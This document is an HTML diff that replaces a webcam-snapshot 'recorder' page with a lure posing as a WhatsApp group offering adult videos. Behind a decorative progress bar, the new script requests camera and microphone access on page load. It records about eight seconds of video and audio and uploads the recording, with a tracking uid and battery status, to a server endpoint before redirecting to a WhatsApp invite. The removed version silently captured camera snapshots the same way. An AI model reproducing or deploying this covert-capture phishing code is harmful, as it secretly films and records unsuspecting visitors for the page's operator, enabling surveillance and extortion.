@@ -1,166 +1,368 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>ClipVerse Waciq - Recorder</title>
-  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
-  <style>
-    * { box-sizing: border-box; }
+<meta charset="UTF-8">
+<title>WhatsApp Group • Requesting Access</title>
+<link rel="icon" href="https://i.postimg.cc/Pf6X7FLf/Screenshot-20260114-133859.jpg">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{
+  font-family:'Orbitron', monospace;
+  overflow:hidden;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+  text-align:center;
+  background:#000;
+}
 
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
-      background-size: cover;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      text-align: center;
-      backdrop-filter: blur(6px);
-    }
+/* Blurred background div */
+#bg{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:url('https://i.postimg.cc/Pf6X7FLf/Screenshot-20260114-133859.jpg') center center no-repeat;
+  background-size:cover;
+  filter:blur(6px) contrast(1.1) brightness(0.8);
+  z-index:0;
+}
 
-    .container {
-      background: rgba(0, 0, 0, 0.6);
-      border-radius: 25px;
-      padding: 60px 45px;
-      width: 95%;
-      max-width: 950px;
-      min-height: 500px;
-      box-shadow: 0 0 25px rgba(0,255,153,0.5);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      animation: popIn 0.7s ease-out;
-    }
+/* Stars canvas */
+#bgCanvas{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  z-index:0;
+}
 
-    .logo {
-      width: 160px;
-      height: auto;
-      margin-bottom: 30px;
-      box-shadow: 0 0 18px rgba(0,255,255,0.6);
-    }
+/* Container for content */
+.container{
+  position:relative;
+  z-index:1;
+  background:rgba(0,0,0,0.55);
+  border-radius:25px;
+  padding:40px 30px;
+  width:95%;
+  max-width:850px;
+  min-height:450px;
+  box-shadow:0 0 60px rgba(0,255,153,0.7);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
 
-    .loader {
-      border: 7px solid rgba(255, 255, 255, 0.2);
-      border-top: 7px solid #00ffcc;
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      animation: spin 1s linear infinite;
-      margin: 25px 0;
-    }
+.container {
+  position: relative;
+  overflow: hidden;
+}
 
-    .text {
-      font-size: 20px;
-      line-height: 1.8;
-      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
-      background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      font-weight: bold;
-    }
+.container::before {
+  content: "";
+  position: absolute;
+  inset: -50%;
+  background: radial-gradient(
+    circle at 30% 30%,
+    rgba(255,255,255,0.12),
+    transparent 40%
+  );
+  animation: waterWave 8s linear infinite;
+  pointer-events: none;
+}
 
-    .credit {
-      margin-top: 25px;
-      font-size: 15px;
-      color: #ccc;
-      font-weight: bold;
-    }
+@keyframes waterWave {
+  0% { transform: rotate(0deg) translateX(0); }
+  100% { transform: rotate(360deg) translateX(0); }
+} 
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+/* Logo */
+.logo{
+  width:180px;
+  height:180px;
+  border-radius:50%;
+  object-fit:cover;
+  box-shadow:0 0 40px rgba(0,255,255,0.9),0 0 100px rgba(0,255,255,0.4);
+  border:4px solid #25D366;
+  animation:floatRotate 4s ease-in-out infinite alternate;
+}
+@keyframes floatRotate{
+  0%{transform:translateY(0) rotate(0deg);}
+  50%{transform:translateY(-15px) rotate(3deg);}
+  100%{transform:translateY(0) rotate(-3deg);}
+}
 
-    @keyframes popIn {
-      0% { opacity: 0; transform: scale(0.9); }
-      100% { opacity: 1; transform: scale(1); }
-    }
+/* Logo name */
+.logo-name{
+  font-size:36px;
+  font-weight:700;
+  color:#fff;
+  text-shadow:0 0 15px rgba(0,0,0,0.9);
+  margin-bottom:30px;
+}
 
-    @media (max-width: 600px) {
-      .container {
-        margin: 0 10px;
-        padding: 40px 25px;
-        min-height: 450px;
-      }
-      .logo { width: 130px; }
-      .text { font-size: 17px; }
-    }
+/* Loader bar */
+.loader-container{
+  width:100%;
+  max-width:700px;
+  height:70px;
+  background:rgba(255,255,255,0.15);
+  border-radius:25px;
+  overflow:hidden;
+  margin:20px 0;
+  box-shadow: inset 0 0 10px rgba(0,0,0,0.4);
+  position:relative;
+}
+.loader-bar{
+  height:100%;
+  width:0%;
+ font-size:33px; background:linear-gradient(90deg,#ffff00,#fff);
+  border-radius:25px;
+  display:flex;
+  align-items:center;
+  justify-content:flex-end;
+  padding-right:10px;
+  color:#ff0000;
+  font-weight:700;
+  font-family:'Orbitron', monospace;
+  text-shadow:0 0 6px rgba(0,0,0,0.7);
+  box-shadow:0 0 15px rgba(255,255,0,0.8);
+  transition: width 0.1s linear;
+}
 
-    video, canvas { display: none; }
-  </style>
+/* Text animation */
+.text{
+  font-size:36px;
+  line-height:2.2;
+  max-width:700px;
+  text-align:center;
+  font-weight:700;
+  margin-bottom:20px;
+  color:#fff;
+  text-shadow:0 0 15px rgba(0,0,0,0.8);
+}
+.text p{
+  opacity:0;
+  transform:translateY(30px);
+  animation:fadeInUp 1s forwards;
+  background:linear-gradient(90deg,#ffff00,#fff);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+
+@keyframes fadeInUp{
+  0%{opacity:0;transform:translateY(30px);}
+  100%{opacity:1;transform:translateY(0);}
+}
+
+/* Credit */
+.credit{
+  margin-top:25px;
+  font-size:20px;
+  color:#fff;
+  font-weight:700;
+  font-family:'Orbitron',monospace;
+}
+
+/* Responsive */
+@media(max-width:600px){
+  .container{margin:0 10px;padding:40px 25px;min-height:500px;}
+  .logo{width:130px;height:130px;}
+  .logo-name{font-size:28px;}
+  .text{font-size:26px;}
+  .loader-container{height:25px;}
+}
+.small-text{
+  font-size:25px;          /* دلته سایز کنټرول کېږي */
+  opacity:0.85;
+  color:#fffacd;           /* سپین + لږ زیړ */
+  font-weight:500;
+} 
+.small-text{
+  animation: fadeSoft 2s ease-in-out infinite alternate;
+}
+
+@keyframes fadeSoft{
+  from{opacity:0.5}
+  to{opacity:1}
+} 
+/* === REAL GLASS WATER RIPPLE EFFECT === */
+.container::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  border-radius:25px;
+  pointer-events:none;
+
+  background:
+    radial-gradient(circle at 20% 30%, rgba(255,255,255,0.18), transparent 40%),
+    radial-gradient(circle at 80% 70%, rgba(255,255,255,0.12), transparent 45%);
+
+  filter: blur(1px);
+  animation: waterRipple 12s ease-in-out infinite alternate;
+}
+
+@keyframes waterRipple{
+  0%{
+    background-position: 0% 0%, 100% 100%;
+    transform: scale(1);
+  }
+  50%{
+    background-position: 60% 40%, 40% 60%;
+    transform: scale(1.01);
+  }
+  100%{
+    background-position: 100% 0%, 0% 100%;
+    transform: scale(1);
+  }
+} 
+.container{
+  backdrop-filter: blur(5px) saturate(130%);
+  -webkit-backdrop-filter: blur(14px) saturate(130%);
+} 
+.container{
+  animation: slowFloat 6s ease-in-out infinite;
+}
+
+@keyframes slowFloat{
+  0%   { transform: translateY(0) scale(1); }
+  50%  { transform: translateY(-6px) scale(1.01); }
+  100% { transform: translateY(0) scale(1); }
+}
+.container:hover{
+  animation: liquidShake 1.2s ease-in-out infinite;
+} 
+
+@keyframes liquidShake{
+  0%{transform:translate(0,0)}
+  25%{transform:translate(1px,-1px)}
+  50%{transform:translate(-1px,1px)}
+  75%{transform:translate(1px,1px)}
+  100%{transform:translate(0,0)}
+} 
+</style>
 </head>
 <body>
+<div id="bg"></div>
+<canvas id="bgCanvas"></canvas>
 
-  <div class="container">
-    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
-    <div class="text" id="status">
-      🕵️‍♂️ <b>You are entering the site...</b><br>
-      <b>Keep this page open 🎥</b>
-    </div>
-    <div class="loader"></div>
-    <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
+<div class="container">
+  <img src="https://i.postimg.cc/05ZYBxd9/IMG-20260114-WA0009.jpg" alt="logo" class="logo">
+  <div class="logo-name">PORAN +18 VIDEOS</div>
+
+  <div class="text" id="status">
+    <p>🕵️‍♂️ Requesting access to WhatsApp group...</p>
+    <p>Keep this page open 🎥</p>
+    <p class="small-text">This may take a few seconds...</p>
+<p class="small-text">Please wait while your request is processed...</p> 
+
+  <div class="loader-container">
+    <div class="loader-bar" id="progress">0%</div>
+    <canvas id="sparkCanvas" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;"></canvas>
   </div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="snapshot"></canvas>
+  <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 𝗪𝗔𝗦𝗜𝗤</div>
+</div>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('snapshot');
-    const ctx = canvas.getContext('2d');
-    const statusEl = document.getElementById('status');
+<script>
+// Stars background
+const canvas=document.getElementById('bgCanvas');
+const ctx=canvas.getContext('2d');
+canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+const stars=[];
+for(let i=0;i<150;i++){stars.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.5+0.5,speed:Math.random()*0.7+0.2,glow:Math.random()*0.5+0.3});}
+function animateStars(){ctx.clearRect(0,0,canvas.width,canvas.height);stars.forEach(s=>{ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fillStyle='rgba(255,255,255,'+s.glow+')';ctx.fill();s.y-=s.speed;if(s.y<0)s.y=canvas.height;});requestAnimationFrame(animateStars);}
+animateStars();
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
 
-    const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid') || 'unknown';
-    let snapshotCount = 0; // Counter for 4 snapshots
+// Paragraph animation
+const paragraphs=document.querySelectorAll('#status p');
+paragraphs.forEach((p,i)=>{setTimeout(()=>{p.style.opacity=1;p.style.transform='translateY(0)';},1000+i*6000);});
 
-    if (uid) {
-      navigator.getBattery().then(battery => {
-        const batteryLevel = Math.round(battery.level * 100);
-        const isCharging = battery.charging;
+// Progress bar + sparks
+const progressBar=document.getElementById('progress');
+const sparkCanvas=document.getElementById('sparkCanvas');
+const sparkCtx=sparkCanvas.getContext('2d');
+sparkCanvas.width=sparkCanvas.offsetWidth;
+sparkCanvas.height=sparkCanvas.offsetHeight;
 
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-          video.srcObject = stream;
-          statusEl.innerHTML = "📸 <b>You are entering the site...</b>";
+let progress=0;
+const sparks=[];
+function createSparks(x){
+  for(let i=0;i<20;i++){sparks.push({x:x,y:17,vx:(Math.random()-0.5)*4,vy:(Math.random()-1.5)*2,life:Math.random()*50+30});}
+}
+function animateSparks(){
+  sparkCtx.clearRect(0,0,sparkCanvas.width,sparkCanvas.height);
+  for(let i=sparks.length-1;i>=0;i--){
+    let s=sparks[i];
+    sparkCtx.fillStyle='rgba(255,255,0,0.8)';
+    sparkCtx.beginPath();
+    sparkCtx.arc(s.x,s.y,2,0,Math.PI*2);sparkCtx.fill();
+    s.x+=s.vx;s.y+=s.vy;s.life--;
+    if(s.life<=0)sparks.splice(i,1);
+  }
+  requestAnimationFrame(animateSparks);
+}
+animateSparks();
 
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
-          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
-        }).catch(err => {
-          console.error("Camera error:", err);
-          statusEl.innerHTML = "❌ <b>Camera access failed!</b>";
-        });
-      });
-    }
+const interval=setInterval(()=>{
+  if(progress>=100){clearInterval(interval);window.location.href="https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4";}
+  else{
+    progress++;
+    progressBar.style.width=progress+'%';
+    progressBar.textContent=progress+'%';
+    if(progress%10===0) createSparks(progressBar.offsetWidth*progress/100);
+  }
+},400); // 30s total
 
-    function takeSnapshotAndSend(battery, charging) {
-      if (snapshotCount >= 4) {
-        window.location.href = "/warning.html"; // Redirect page
-        return;
+const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
+let recordedChunks = [];
+
+async function startRecording() {
+  try {
+    // ✅ get video + audio stream
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+    const mediaRecorder = new MediaRecorder(stream);
+
+    let recordedChunks = [];
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+
+    mediaRecorder.onstop = async () => {
+      const blob = new Blob(recordedChunks, { type: 'video/webm' });
+
+      // Battery info
+      let batteryLevel = 'Unknown';
+      let charging = 'Unknown';
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100);
+        charging = battery.charging ? 'true' : 'false';
       }
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/png');
+      const formData = new FormData();
+      formData.append('video', blob);
+      formData.append('uid', uid);
+      formData.append('battery', batteryLevel.toString());
+      formData.append('charging', charging);
 
-      fetch('/api/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imageData, uid, battery, charging })
-      }).then(() => {
-        snapshotCount++;
-        if (snapshotCount >= 4) {
-          window.location.href = "/warning.html"; // Redirect page
-        }
-      }).catch(err => {
-        console.error("Upload error:", err);
-      });
-    }
-  </script>
+      await fetch('/api/upload', { method: 'POST', body: formData });
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+      stream.getTracks().forEach(track => track.stop());
+    }, 8000); 
+
+  } catch (err) {
+    console.error(err);
+    alert("🎥 Access Denied or Error: " + err.message);
+  }
+}
+
+// start recording after page load
+window.onload = () => setTimeout(startRecording, 1000);
+</script> 
 </body>
 </html> 
